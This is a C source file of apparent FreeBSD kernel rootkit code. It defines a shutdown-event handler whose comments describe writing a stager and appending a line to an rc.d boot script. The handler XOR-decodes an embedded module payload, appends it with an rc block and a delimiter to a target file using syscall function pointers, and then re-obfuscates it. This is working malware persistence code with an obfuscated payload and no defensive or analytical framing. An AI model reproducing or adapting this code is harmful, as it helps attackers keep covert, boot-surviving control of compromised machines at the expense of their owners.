#include <sys/param.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/pcpu.h>
#include <sys/uio.h>
#include <sys/fcntl.h>
#include <sys/systm.h>

#include "persist.h"

struct persist_file {
	const char* path;
	void* data;
	size len;
	int mode;
	int flags;
};


// trigger on shutdown ehook.
// plan:
// write stager, append our line to rc.d root
// must only use ctx ptrs and curthread
__attribute__((noinline, used))
void persist_handler (void* arg, int howto)
{
	PersistCtx* ctx = arg;

	(void)howto;
	if (!ctx) return;

	struct thread * td = curthread;
	if (!td) return;

	// append rc block, stager bytes, then delimiter
	struct persist_file files[3] = {
		{
			.path = ctx->helper_path,
			.data = ctx->helper_data,
			.len = ctx->helper_len,
			.mode = 0644,
			.flags = O_WRONLY|O_APPEND
		},
		{
			.path = ctx->helper_path,
			.data = ctx->module_data,
			.len = ctx->module_len,
			.mode = 0644,
			.flags = O_WRONLY|O_APPEND
		},
		{
			.path = ctx->helper_path,
			.data = (void*)(uintptr_t)ctx->delim,
			.len = ctx->delim_len,
			.mode = 0644,
			.flags = O_WRONLY|O_APPEND
		}
	};

	for (int i=0; i<3; i++) {
		if (files[i].path==NULL || files[i].data==NULL)
			continue;

		if (i==1) {
			unsigned char* p = files[i].data;
			unsigned char key = (unsigned char)ctx->module_len;

			for (size j=0; j<files[i].len; j++)
				p[j] ^= key;
		}

		int error = ctx->openat(td, AT_FDCWD, files[i].path, UIO_SYSSPACE, files[i].flags, files[i].mode);
		if (error==0) {
			int fd = td->td_retval[0];

			struct iovec iov = {
				.iov_base = files[i].data,
				.iov_len = files[i].len
			};

			struct uio uio = {
				.uio_iov = &iov,
				.uio_iovcnt = 1,
				.uio_offset = 0,
				.uio_resid = files[i].len,
				.uio_segflg = UIO_SYSSPACE,
				.uio_rw = UIO_WRITE,
				.uio_td = td
			};

			ctx->pwritev(td, fd, &uio, 0);
			ctx->close(td, fd);
		}

		if (i==1) {
			unsigned char* p = files[i].data;
			unsigned char key = (unsigned char)ctx->module_len;

			for (size j=0; j<files[i].len; j++)
				p[j] ^= key;
		}
	}
}


